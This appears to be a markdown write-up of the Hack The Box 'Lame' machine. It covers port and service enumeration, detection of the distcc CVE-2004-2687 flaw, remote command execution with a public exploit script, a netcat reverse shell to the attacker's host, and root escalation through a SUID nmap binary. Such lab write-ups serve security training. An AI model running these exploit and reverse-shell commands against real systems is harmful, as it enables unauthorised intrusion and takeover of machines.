@@ -1,0 +1,238 @@
+---
+tags:
+  - distcc
+  - CVE-2004-2687
+---
+# HTB Lame
+
+***Overview**: Lame is a easy rated machine on Hackthebox that exploits the Distcc service vulnerable to CVE-2004-2687 which allows us to execute arbitrary code to gain foothold to the machine and then escalates privileges by exploiting the nmap SUID binary.*
+
+## Scanning and Enumeration
+
+- So we start by scanning for open ports using masscan
+
+```shell
+┌──(kali㉿kali)-[~/HTB/Lame]
+└─$ sudo masscan -p1-65535 10.10.10.3 --rate=1000 -e tun0 > ports
+[sudo] password for kali: 
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-11-11 14:17:10 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/HTB/Lame]
+└─$ cat ports
+Discovered open port 22/tcp on 10.10.10.3                                      
+Discovered open port 3632/tcp on 10.10.10.3                                    
+Discovered open port 139/tcp on 10.10.10.3                                     
+Discovered open port 21/tcp on 10.10.10.3                                      
+Discovered open port 445/tcp on 10.10.10.3                                     
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/HTB/Lame]
+└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
+```
+
+- then we go ahead to scan for the services on those open ports
+
+```shell
+┌──(kali㉿kali)-[~/HTB/Lame]
+└─$ nmap -sV -sC -oA nmap/lame_ports 10.10.10.3 -v -Pn
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 09:20 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 09:20
+Completed NSE at 09:20, 0.00s elapsed
+Initiating NSE at 09:20
+Completed NSE at 09:20, 0.00s elapsed
+Initiating NSE at 09:20
+Completed NSE at 09:20, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 09:20
+Completed Parallel DNS resolution of 1 host. at 09:20, 0.05s elapsed
+Initiating Connect Scan at 09:20
+Scanning 10.10.10.3 [1000 ports]
+Discovered open port 21/tcp on 10.10.10.3
+Discovered open port 22/tcp on 10.10.10.3
+Discovered open port 445/tcp on 10.10.10.3
+Discovered open port 139/tcp on 10.10.10.3
+Completed Connect Scan at 09:20, 11.35s elapsed (1000 total ports)
+Initiating Service scan at 09:20
+Scanning 4 services on 10.10.10.3
+Completed Service scan at 09:20, 11.53s elapsed (4 services on 1 host)
+NSE: Script scanning 10.10.10.3.
+Initiating NSE at 09:20
+NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
+Completed NSE at 09:21, 42.26s elapsed
+Initiating NSE at 09:21
+Completed NSE at 09:21, 1.21s elapsed
+Initiating NSE at 09:21
+Completed NSE at 09:21, 0.01s elapsed
+Nmap scan report for 10.10.10.3
+Host is up (0.17s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.7
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_smb2-time: Protocol negotiation failed (SMB2)
+|_clock-skew: mean: 2h30m24s, deviation: 3h32m14s, median: 19s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2023-11-11T09:21:27-05:00
+
+```
+
+### FTP Enumeration
+
+- we tried to places files into the ftp server but we don't have access to do so and neither did we see any useful files in the ftp server
+
+![](assets/Lame_assets/Pasted%20image%2020231111160110.png)
+
+### SMB Enumeration
+
+- So we can enumerate for open shares and we can see some of them
+
+![](assets/Lame_assets/Pasted%20image%2020231111160047.png)
+
+- we also have read access to the tmp directory but that is about it.
+
+![](assets/Lame_assets/Pasted%20image%2020231111160017.png)
+
+### Enumerating Distcc: Port 3632
+
+Resource: [https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc](https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc)
+
+```ad-note
+DistCC (Distributed Compiler Client/Server) is a tool for speeding up the compilation of source code using distributed computing over a network. it comprises of a server distccd and a client discc, the server accepts and runs the compilation tasks for clients.
+- it distributes these compilation tasks accross multiple machines on the network
+- first of all it analyses the source code and divides its into smaller tasks
+- then it send the tasks to other machines on the network known as "Compiler Hosts" (Servers) that also habe distcc running
+```
+
+> Vulnerable to cve2004-2687
+> Distcc 2.x when not configured to restrict access to the server port, allows remote attackers to execute arbitrary commands via compilation jobs, which are executed by the server without authorization checks.
+
+
+- so we go ahead to scan if the application is vulnerable to the cve2004-2687 vulnerability, and we can see that it is indeed vulnerable
+
+```shell
+┌──(kali㉿kali)-[~/HTB/Lame]
+└─$ nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 -Pn
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 09:55 EST
+Nmap scan report for 10.10.10.3
+Host is up (0.16s latency).
+
+PORT     STATE SERVICE
+3632/tcp open  distccd
+| distcc-cve2004-2687: 
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
+|   
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+|_      https://distcc.github.io/security.html
+
+Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
+
+```
+
+## Exploitation: CVE-2004-2687
+
+- So utilizing the exploit at  [https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855), we can check by running the id command and we can see that it does go through, we can also run the ls command too
+
+```shell
+┌──(kali㉿kali)-[~/HTB/Lame]
+└─$ python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "id"
+[OK] Connected to remote service
+
+--- BEGIN BUFFER ---
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+
+--- END BUFFER ---
+
+[OK] Done.
+```
+
+![](assets/Lame_assets/Pasted%20image%2020231111155940.png)
+
+- we then get a shell by executing a reverse shell with nc
+
+```shell
+python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.7 4444 -e /bin/bash"
+```
+
+![](assets/Lame_assets/Pasted%20image%2020231111160657.png)
+
+- and in our nc listener, we get shell
+
+![](assets/Lame_assets/Pasted%20image%2020231111160739.png)
+
+- we can view the user file
+
+![](assets/Lame_assets/Pasted%20image%2020231111164111.png)
+
+## Privilege Escalation
+
+- so we run linpeas for post exploitation enumeration
+
+![](assets/Lame_assets/Pasted%20image%2020231111163911.png)
+
+![](assets/Lame_assets/Pasted%20image%2020231111164022.png)
+
+- we can see that the nmap binary has the SUID bit set
+
+![](assets/Lame_assets/Pasted%20image%2020231111164414.png)
+- so we get an interactive shell using nmap by running
+
+```shell
+nmap --interactive
+```
+
+- and we have root access
+
+![](assets/Lame_assets/Pasted%20image%2020231111202808.png)
+
+- we can view the root file
+
+![](assets/Lame_assets/Pasted%20image%2020231111202745.png)
